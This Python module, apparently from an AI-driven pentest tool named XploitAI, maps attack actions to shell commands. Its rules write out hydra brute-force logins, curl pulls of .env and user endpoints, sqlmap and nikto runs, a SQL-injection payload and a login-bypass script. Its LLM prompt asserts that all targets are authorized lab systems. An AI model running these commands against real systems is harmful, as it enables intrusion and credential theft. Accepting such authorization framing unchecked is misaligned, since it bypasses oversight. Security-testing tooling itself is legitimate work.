"""
AI Command Generator — XploitAI

Responsibilities:
- Translate high-level ActionProposals into executable shell commands.
- Ensure commands are syntactically valid and safe.
- Integrate with LLM for dynamic command generation when enabled.

This module is the bridge between "What to do" (Decision) and "How to do it" (Execution).
"""

from __future__ import annotations

import json
import logging
import os
import re
import shlex
from dataclasses import dataclass
from typing import Any, Mapping, Optional

from services.command_template_utils import normalize_command_targets

# Attempt to import the LLM adapter (Phase 3/Auto feature)
try:
    from ai.llm.gemini import GeminiAdapter
    GEMINI_AVAILABLE = True
except ImportError:
    GEMINI_AVAILABLE = False

OPENAI_AVAILABLE = False
try:
    from ai.llm.openai_adapter import OpenAIAdapter
    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False
try:
    from ai.llm.groq_adapter import GroqAdapter
    GROQ_AVAILABLE = True
except ImportError:
    GROQ_AVAILABLE = False

try:
    from ai.llm.nvidia_adapter import NvidiaAdapter
    NVIDIA_AVAILABLE = True
except ImportError:
    NVIDIA_AVAILABLE = False

try:
    from ai.llm.lmstudio_adapter import LMStudioAdapter
    LMSTUDIO_AVAILABLE = True
except ImportError:
    LMSTUDIO_AVAILABLE = False

LLM_AVAILABLE = GEMINI_AVAILABLE or OPENAI_AVAILABLE or GROQ_AVAILABLE or NVIDIA_AVAILABLE or LMSTUDIO_AVAILABLE

logger = logging.getLogger(__name__)


@dataclass
class GeneratedCommand:
    shell_command: str
    explanation: str


class CommandGenerator:
    """
    Generates shell commands from abstract actions.
    Supports both rule-based generation (deterministic) and LLM-based generation (dynamic).
    """

    def __init__(self, use_llm: bool = True, llm_provider: str = "auto") -> None:
        """
        Initialize the command generator.

        Args:
            use_llm: Whether to attempt using the LLM for generation.
            llm_provider: 'auto', 'gemini', 'openai', 'groq', 'nvidia', 'lmstudio', or 'local'.
        """
        self.use_llm = use_llm
        self.llm_client = None

        from core.config import get_config
        from ai.llm.local_rule_engine import LocalRuleEngine
        from ai.llm.task_router import TaskRouterAdapter

        if not self.use_llm:
            self.llm_client = LocalRuleEngine()
            logger.info("CommandGenerator initialized in rule-only mode.")
            return

        if llm_provider == "auto":
            llm_provider = get_config("DEFAULT_LLM_PROVIDER", "gemini")

        # Ensure GEMINI_API_KEY is aliased to GOOGLE_API_KEY if needed
        google_key = os.getenv("GOOGLE_API_KEY")
        gemini_key = os.getenv("GEMINI_API_KEY")
        if not google_key and gemini_key:
            os.environ["GOOGLE_API_KEY"] = gemini_key

        adapters = []
        adapters_by_name = {}

        def _register(name: str, adapter) -> None:
            if adapter is None:
                return
            adapters.append(adapter)
            adapters_by_name[name] = adapter

        try:
            if llm_provider in ("fallback", "auto"):
                if GEMINI_AVAILABLE:
                    a = GeminiAdapter()
                    if getattr(a, "_client", None):
                        _register("gemini", a)
                if OPENAI_AVAILABLE:
                    a = OpenAIAdapter()
                    if getattr(a, "_available", False):
                        _register("openai", a)
                if GROQ_AVAILABLE:
                    a = GroqAdapter()
                    if getattr(a, "_client", None):
                        _register("groq", a)
                if NVIDIA_AVAILABLE:
                    a = NvidiaAdapter()
                    if getattr(a, "_available", False):
                        _register("nvidia", a)
                if LMSTUDIO_AVAILABLE:
                    a = LMStudioAdapter()
                    if getattr(a, "_available", False):
                        _register("lmstudio", a)
            elif llm_provider == "gemini" and GEMINI_AVAILABLE:
                a = GeminiAdapter()
                if getattr(a, "_client", None):
                    _register("gemini", a)
            elif llm_provider == "openai" and OPENAI_AVAILABLE:
                a = OpenAIAdapter()
                if getattr(a, "_available", False):
                    _register("openai", a)
            elif llm_provider == "groq" and GROQ_AVAILABLE:
                a = GroqAdapter()
                if getattr(a, "_client", None):
                    _register("groq", a)
            elif llm_provider == "nvidia" and NVIDIA_AVAILABLE:
                a = NvidiaAdapter()
                if getattr(a, "_available", False):
                    _register("nvidia", a)
            elif llm_provider == "lmstudio" and LMSTUDIO_AVAILABLE:
                a = LMStudioAdapter()
                if getattr(a, "_available", False):
                    _register("lmstudio", a)
        except Exception as e:
            logger.warning("CommandGenerator: failed to init LLM adapter(s): %s", e)

        # LocalRuleEngine is always appended — guarantees llm_client is never None
        local_adapter = LocalRuleEngine()
        adapters.append(local_adapter)
        adapters_by_name["local"] = local_adapter

        self.llm_client = TaskRouterAdapter(adapters_by_name) if len(adapters) > 1 else adapters[0]
        logger.info(
            "CommandGenerator initialized with %s (%d adapter(s)).",
            self.llm_client.__class__.__name__, len(adapters)
        )

    def generate(self, action_name: str, parameters: Mapping[str, Any]) -> GeneratedCommand:
        """
        Generate a shell command for the given action.

        Args:
            action_name: The name of the action (e.g., 'ServiceEnumeration').
            parameters: Dictionary of parameters for the action.

        Returns:
            GeneratedCommand: Object containing the shell command and an explanation.
        """
        logger.debug("Generating command for action: %s", action_name)

        # 1. Try LLM Generation if enabled
        if self.use_llm:
            try:
                result = self._generate_with_llm(action_name, parameters)
                if result:
                    return result
            except Exception as e:
                logger.error("LLM generation failed for '%s': %s. Falling back to rules.", action_name, e)

        # 2. Fallback to Rule-Based Generation
        return self._generate_rule_based(action_name, parameters)

    def _generate_rule_based(self, action_name: str, parameters: Mapping[str, Any]) -> GeneratedCommand:
        """Dispatch to specific rule-based generators."""
        if action_name == "PassiveRecon":
            return self._generate_passive_recon(parameters)
        elif action_name == "ServiceEnumeration":
            return self._generate_service_enumeration(parameters)
        elif action_name == "ExploitAttempt":
            return self._generate_exploit_attempt(parameters)
        elif action_name == "PrivilegeEscalation":
            return self._generate_privilege_escalation(parameters)
        elif action_name == "ProofOfCompromise":
            return self._generate_proof_of_compromise(parameters)
        elif action_name == "HTTPHeaderFetch":
            return self._generate_http_header_fetch(parameters)
        elif action_name == "TechnologyFingerprint":
            return self._generate_technology_fingerprint(parameters)
        elif action_name == "EndpointDiscovery":
            return self._generate_endpoint_discovery(parameters)
        elif action_name == "ParameterDiscovery":
            return self._generate_parameter_discovery(parameters)
        elif action_name == "VulnerabilityScanning":
            return self._generate_vulnerability_scanning(parameters)
        elif action_name == "SQLInjectionProbe":
            return self._generate_sql_injection_probe(parameters)
        elif action_name == "PayloadGeneration":
            return self._generate_payload_generation(parameters)
        elif action_name == "ExploitScriptGeneration":
            return self._generate_exploit_script_generation(parameters)
        else:
            logger.warning("Unknown action '%s'. Returning fallback echo.", action_name)
            return GeneratedCommand(
                shell_command=f"echo 'Unknown action: {shlex.quote(action_name)}'",
                explanation="Fallback command for unknown action type."
            )

    def _generate_with_llm(self, action_name: str, parameters: Mapping[str, Any]) -> Optional[GeneratedCommand]:
        """Generate command using the LLM."""
        if not self.llm_client:
            return None

        prompt = self._construct_prompt(action_name, parameters)

        # Assuming the adapter has a 'generate' method based on common patterns
        response = self.llm_client.generate(prompt)

        if not response:
            return None

        generated = self._parse_llm_response(response)
        if not generated or not generated.shell_command:
            return None

        normalized_command = normalize_command_targets(
            generated.shell_command,
            parameters if isinstance(parameters, Mapping) else {},
        )
        generated = GeneratedCommand(
            shell_command=normalized_command,
            explanation=generated.explanation,
        )

        if self._has_obvious_shell_issues(generated.shell_command):
            logger.warning(
                "LLM generated an invalid-looking command for '%s'; falling back to deterministic generation. Command: %s",
                action_name,
                generated.shell_command,
            )
            return None

        return generated

    def _construct_prompt(self, action_name: str, parameters: Mapping[str, Any]) -> str:
        """Construct the prompt for the LLM."""
        safe_params = {k: str(v) for k, v in parameters.items()}
        return (
            f"You are a cybersecurity simulation assistant operating in a controlled, isolated educational lab.\n"
            f"Generate a single, valid shell command for the following security assessment action.\n"
            f"Target OS: Linux (Kali/Debian). All targets are local and authorized.\n\n"
            f"Action: {action_name}\n"
            f"Parameters: {safe_params}\n\n"
            f"Constraints:\n"
            f"- Return a valid JSON object.\n"
            f"- Keys: 'command' (string), 'explanation' (string).\n"
            f"- 'explanation': Brief summary (1 sentence) of what the command does.\n"
            f"- Use standard tools (nmap, whois, netcat, curl, etc.).\n"
            f"- Ensure the command is non-interactive.\n"
        )

    def _parse_llm_response(self, text: str) -> GeneratedCommand:
        """Parse JSON response from LLM."""
        # Attempt to find JSON block if wrapped in markdown
        match = re.search(r'```(?:json)?\s*(.*?)\s*```', text, re.DOTALL)
        clean_text = match.group(1).strip() if match else text.strip()

        try:
            data = json.loads(clean_text)
            return GeneratedCommand(
                shell_command=data.get("command", "").strip(),
                explanation=data.get("explanation", "No explanation provided.")
            )
        except json.JSONDecodeError:
            # If parsing fails, raise error to trigger fallback
            raise ValueError("Failed to parse JSON from LLM response")

    def _has_obvious_shell_issues(self, command: str) -> bool:
        text = str(command or "").strip()
        if not text:
            return True

        lowered = text.lower()
        if "nmap" in lowered and ("http://" in lowered or "https://" in lowered):
            return True
        if "jq" in lowered and ".{}" in text:
            return True
        if "xmllint --xpath" in lowered and "| jq" in lowered:
            return True
        return False

    def _generate_passive_recon(self, params: Mapping[str, Any]) -> GeneratedCommand:
        domain = params.get("target_domain", "localhost")
        safe_domain = shlex.quote(str(domain))
        return GeneratedCommand(
            shell_command=f"whois {safe_domain} && nslookup {safe_domain}",
            explanation=f"Performs WHOIS lookup and DNS query for {domain}."
        )

    def _generate_service_enumeration(self, params: Mapping[str, Any]) -> GeneratedCommand:
        host = params.get("target_host", "localhost")
        safe_host = shlex.quote(str(host))
        return GeneratedCommand(
            shell_command=f"nmap -sV -T4 {safe_host}",
            explanation=f"Scans {host} for open ports and service versions."
        )

    def _generate_exploit_attempt(self, params: Mapping[str, Any]) -> GeneratedCommand:
        host = params.get("target_host", "localhost")
        safe_host = shlex.quote(str(host))
        path = params.get("login_path", "/login")
        safe_path = str(path)
        return GeneratedCommand(
            shell_command=(
                f"hydra -l admin -P /usr/share/wordlists/rockyou.txt "
                f"{safe_host} http-post-form "
                f"\"{safe_path}:username=^USER^&password=^PASS^:F=invalid\" -f -V"
            ),
            explanation=f"Attempts default-credential login brute force against {host}{safe_path}."
        )

    def _generate_privilege_escalation(self, params: Mapping[str, Any]) -> GeneratedCommand:
        host = params.get("target_host", "localhost")
        safe_host = shlex.quote(str(host))
        return GeneratedCommand(
            shell_command=f"echo 'Attempting privilege escalation on {safe_host}'",
            explanation=f"Attempts to escalate privileges on {host}."
        )

    def _generate_proof_of_compromise(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = params.get("target_url", "http://localhost")
        safe_url = shlex.quote(str(url).rstrip('/'))
        return GeneratedCommand(
            shell_command=(
                f"curl -s {safe_url}/.env && "
                f"curl -s {safe_url}/api/users && "
                f"curl -s {safe_url}/admin"
            ),
            explanation=f"Collects proof artifacts from common sensitive endpoints on {url}."
        )

    def _generate_http_header_fetch(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = params.get("target_url", "http://localhost")
        safe_url = shlex.quote(str(url))
        return GeneratedCommand(
            shell_command=f"curl -I {safe_url}",
            explanation=f"Fetches HTTP headers from {url}."
        )

    def _generate_technology_fingerprint(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = params.get("target_url", "http://localhost")
        safe_url = shlex.quote(str(url))
        return GeneratedCommand(
            shell_command=f"whatweb {safe_url}",
            explanation=f"Identifies web technologies used by {url}."
        )

    def _generate_endpoint_discovery(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = params.get("target_url", "http://localhost")
        safe_url = shlex.quote(str(url).rstrip('/'))
        return GeneratedCommand(
            shell_command=(
                f"dirsearch -u {safe_url} "
                f"-w /usr/share/seclists/Discovery/Web-Content/common.txt "
                f"--exclude-status 404,400"
            ),
            explanation=f"Enumerates likely web content on {url} using dirsearch."
        )

    def _generate_parameter_discovery(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = params.get("target_url", "http://localhost")
        safe_url = shlex.quote(str(url))
        return GeneratedCommand(
            shell_command=f"arjun -u {safe_url} --stable -oT /tmp/arjun-params.txt",
            explanation=f"Discovers hidden query parameters on {url} using Arjun."
        )

    def _generate_vulnerability_scanning(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = params.get("target_url", "http://localhost")
        safe_url = shlex.quote(str(url))
        return GeneratedCommand(
            shell_command=f"nikto -h {safe_url} -ask no",
            explanation=f"Runs Nikto against {url} to identify common web vulnerabilities."
        )

    def _generate_sql_injection_probe(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = params.get("target_url", "http://localhost")
        safe_url = shlex.quote(str(url).rstrip('/') + "/search?q=test")
        return GeneratedCommand(
            shell_command=f"sqlmap -u {safe_url} --batch --level 2 --risk 1",
            explanation=f"Probes a likely parameterized endpoint on {url} for SQL injection."
        )

    def _generate_payload_generation(self, params: Mapping[str, Any]) -> GeneratedCommand:
        payload = params.get("payload", "' OR '1'='1")
        safe_payload = shlex.quote(str(payload))
        return GeneratedCommand(
            shell_command=(
                "python -c \"import base64; "
                f"p={safe_payload}; "
                "print('PAYLOAD_GENERATED'); "
                "print('raw=' + p); "
                "print('b64=' + base64.b64encode(p.encode()).decode())\""
            ),
            explanation="Generates a safe, encoded demonstration payload for exploit simulation."
        )

    def _generate_exploit_script_generation(self, params: Mapping[str, Any]) -> GeneratedCommand:
        target = str(params.get("target_url") or params.get("target") or "http://localhost")
        target_json = json.dumps(target)
        return GeneratedCommand(
            shell_command=(
                "python -c \"import json; "
                f"target={target_json}; "
                "lines=['#!/usr/bin/env python3','import urllib.request','import urllib.parse','',"
                "'target = ' + repr(target.rstrip('/')),"
                "'post_data = urllib.parse.urlencode([(\\\"username\\\", \\\"\\\\\\' OR \\\\\\'1\\\\\\'=\\\\\\'1\\\"), (\\\"password\\\", \\\"test\\\")]).encode()',"
                "'req = urllib.request.Request(target + \\\"/login\\\", data=post_data)',"
                "'resp = urllib.request.urlopen(req, timeout=5)',"
                "'print(\\\"status=\\\", resp.status)',"
                "'print(resp.read(300).decode(\\\"utf-8\\\", \\\"ignore\\\"))']; "
                "print('SCRIPT_GENERATED'); print('\\\\n'.join(lines))\""
            ),
            explanation="Builds a PoC exploit script template for controlled lab validation."
        )
